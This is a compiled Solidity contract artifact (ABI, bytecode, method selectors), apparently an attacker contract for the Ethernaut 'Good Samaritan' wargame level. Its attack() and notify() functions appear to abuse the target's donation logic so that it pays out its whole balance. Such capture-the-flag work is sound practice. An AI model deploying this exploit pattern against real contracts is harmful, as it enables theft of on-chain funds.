{"abi":[{"type":"constructor","inputs":[{"name":"_goodSamaritan","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"coinAddress","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"notify","inputs":[{"name":"","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"walletAddress","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x60e060405234801561000f575f5ffd5b5060405161040638038061040683398101604081905261002e9161013e565b6001600160a01b03811660808190526040805163521eb27360e01b8152905163521eb273916004808201926020929091908290030181865afa158015610076573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061009a919061013e565b6001600160a01b031660a0816001600160a01b0316815250506080516001600160a01b03166311df99956040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100f1573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610115919061013e565b6001600160a01b031660c05250610160565b6001600160a01b038116811461013b575f5ffd5b50565b5f6020828403121561014e575f5ffd5b815161015981610127565b9392505050565b60805160a05160c05161027861018e5f395f60c001525f605301525f818160e4015261017601526102785ff3fe608060405234801561000f575f5ffd5b506004361061004a575f3560e01c80636ad5b3ea1461004e57806398d078b41461009e5780639e5faafc146100b3578063fdc61dd1146100bb575b5f5ffd5b6100757f000000000000000000000000000000000000000000000000000000000000000081565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b6100b16100ac366004610205565b6100e2565b005b6100b1610174565b6100757f000000000000000000000000000000000000000000000000000000000000000081565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af115801561014c573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610170919061021c565b5050565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663251436386040518163ffffffff1660e01b81526004016020604051808303815f875af11580156101de573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610202919061021c565b50565b5f60208284031215610215575f5ffd5b5035919050565b5f6020828403121561022c575f5ffd5b8151801515811461023b575f5ffd5b939250505056fea2646970667358221220c9225207b9ffafdf849d70c75fbfa542b15e8b2031f60c34bb46a918256d514e64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","coinAddress()":"fdc61dd1","notify(uint256)":"98d078b4","walletAddress()":"6ad5b3ea"},"id":1}